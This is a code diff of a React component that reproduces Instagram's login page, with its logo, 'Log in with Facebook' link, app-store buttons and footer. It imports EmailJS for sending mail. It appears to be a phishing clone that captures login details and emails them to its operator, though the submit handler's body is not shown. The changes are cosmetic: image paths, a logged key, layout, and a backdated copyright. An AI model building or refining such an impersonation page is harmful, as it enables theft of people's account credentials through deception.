@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import emailjs from "@emailjs/browser";
-import "./App.css";
+import "./App.css"; // Assuming your CSS is in App.css
 
 const InstagramLogin = () => {
   const [email, setEmail] = useState("");
@@ -8,7 +8,8 @@ const InstagramLogin = () => {
 
   useEffect(() => {
     const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
-    emailjs.init(publicKey);
+    console.log("Initializing EmailJS with public key:", publicKey);
+    emailjs.init(publicKey); // Initialize EmailJS with public key
   }, []);
 
   const handleLogin = () => {
@@ -41,7 +42,7 @@ const InstagramLogin = () => {
           <div className="panel login flex direction-column">
             <h1 title="Instagram" className="flex justify-content-center">
               <img
-                src="./img/instagram-logo.png"
+                src="/img/instagram-logo.png"
                 alt="Instagram logo"
                 title="Instagram logo"
               />
@@ -80,9 +81,11 @@ const InstagramLogin = () => {
               <span></span>
             </div>
             <div className="login-with-fb flex direction-column align-items-center">
-              <div>
+              <div className="flex align-items-center">
+                {/* <img src="/img/insta-fav.ico" alt="Facebook logo" /> */}
                 <a>Log in with Facebook</a>
               </div>
+
               <a href="#">Forgot password?</a>
             </div>
           </div>
@@ -94,12 +97,12 @@ const InstagramLogin = () => {
             <p>Get the app.</p>
             <div className="flex justify-content-center">
               <img
-                src="./img/apple-button.png"
+                src="/img/apple-button.png"
                 alt="Apple Store logo"
                 title="Apple Store logo"
               />
               <img
-                src="./img/googleplay-button.png"
+                src="/img/googleplay-button.png"
                 alt="Google Play logo"
                 title="Google Play logo"
               />
@@ -143,7 +146,7 @@ const InstagramLogin = () => {
             <a href="#">LANGUAGE</a>
           </li>
         </ul>
-        <p className="copyright">© 2024 Instagram from Facebook</p>
+        <p className="copyright">© 2020 Instagram from Facebook</p>
       </footer>
     </div>
   );
